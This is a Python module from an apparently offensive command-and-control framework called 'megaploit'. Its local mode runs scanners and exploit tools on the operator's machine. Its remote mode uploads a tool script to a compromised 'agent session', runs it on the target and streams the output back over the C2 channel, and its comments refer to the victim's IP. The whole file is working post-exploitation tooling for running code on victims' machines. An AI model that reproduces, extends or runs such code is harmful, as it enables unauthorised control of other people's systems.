"""
megaploit.toolbox.runner
~~~~~~~~~~~~~~~~~~~~~~~~
Run an installed tool **locally on the operator's machine** and stream
its output back to the CLI.

Two execution modes
-------------------
local   — run the tool here (useful for network scanners, OSINT tools,
          exploit frameworks that target a remote host).

remote  — upload the tool's entry-point (and optional extra files) to
          the active agent session, then execute it there via the shell
          handler, streaming output back through the C2 channel.
"""

from __future__ import annotations

import os
import subprocess
import sys
import threading
from typing import Callable, Optional

from megaploit.toolbox.registry import Tool, registry, TOOLS_DIR

OutputFn = Callable[[str], None]
_NOOP: OutputFn = lambda _: None


# ---------------------------------------------------------------------------
# Local execution
# ---------------------------------------------------------------------------

def run_local(
    name: str,
    tool_args: list[str],
    output: OutputFn = _NOOP,
    timeout: Optional[int] = None,
) -> int:
    """
    Run the named tool locally.

    The tool's local venv python is preferred if present; otherwise the
    current interpreter is used.

    Returns the process exit code.
    Raises RuntimeError if the tool is not installed.
    """
    tool = registry.get(name)
    if not tool:
        raise RuntimeError(f"Tool '{name}' not found — install it first.")
    if not tool.is_installed:
        raise RuntimeError(f"Tool directory missing: {tool.path}")
    if not os.path.isfile(tool.entry_path):
        raise RuntimeError(
            f"Entry-point not found: {tool.entry_path}\n"
            f"Fix with:  toolbox set-entry {name} <relative/path.py>"
        )

    python = _pick_python(tool)
    cmd = [python, tool.entry_path] + tool_args

    output(f"[*] Running: {' '.join(cmd)}")
    output(f"[*] Working directory: {tool.path}")
    output("")

    proc = subprocess.Popen(
        cmd,
        cwd=tool.path,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        encoding="utf-8",
        errors="replace",
    )

    stop = threading.Event()

    def _stream():
        for line in proc.stdout:
            output(line.rstrip())

    t = threading.Thread(target=_stream, daemon=True)
    t.start()
    try:
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.kill()
        output(f"[!] Tool timed out after {timeout}s — process killed.")
    finally:
        t.join(timeout=2)

    output(f"\n[*] Exit code: {proc.returncode}")
    return proc.returncode


# ---------------------------------------------------------------------------
# Remote execution (via agent session)
# ---------------------------------------------------------------------------

def run_remote(
    name: str,
    tool_args: list[str],
    session,            # megaploit.server.session.Session
    output: OutputFn = _NOOP,
    timeout: int = 120,
) -> None:
    """
    Upload the tool's entry-point to the agent and execute it there,
    streaming output back through the C2 channel.

    This is intentionally lightweight — it uploads a single script
    (the entry-point) and runs it with the agent's system Python.
    For tools with many dependencies, prefer local mode and point the
    tool at the victim's IP/port.
    """
    from megaploit.core.protocol import send_msg, recv_msg, send_file

    tool = registry.get(name)
    if not tool:
        raise RuntimeError(f"Tool '{name}' not found.")
    if not os.path.isfile(tool.entry_path):
        raise RuntimeError(f"Entry-point not found: {tool.entry_path}")

    remote_script = f"_tool_{name}.py"

    # 1. Upload the entry-point
    output(f"[*] Uploading {tool.entry} → {remote_script}")
    send_msg(session.conn, f"upload {remote_script}")
    send_file(session.conn, tool.entry_path)

    # 2. Execute it
    arg_str = " ".join(tool_args)
    shell_cmd = f"python {remote_script} {arg_str}".strip()
    output(f"[*] Executing on target: {shell_cmd}")
    send_msg(session.conn, shell_cmd)

    # 3. Stream the response
    old_timeout = session.conn.gettimeout()
    session.conn.settimeout(timeout)
    try:
        resp = recv_msg(session.conn)
        output(resp)
    except Exception as e:
        output(f"[-] Error receiving output: {e}")
    finally:
        session.conn.settimeout(old_timeout)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _pick_python(tool: Tool) -> str:
    """Prefer the venv python if present, else current interpreter."""
    if sys.platform == "win32":
        venv_python = os.path.join(tool.path, ".venv", "Scripts", "python.exe")
    else:
        venv_python = os.path.join(tool.path, ".venv", "bin", "python")
    if os.path.isfile(venv_python):
        return venv_python
    return sys.executable
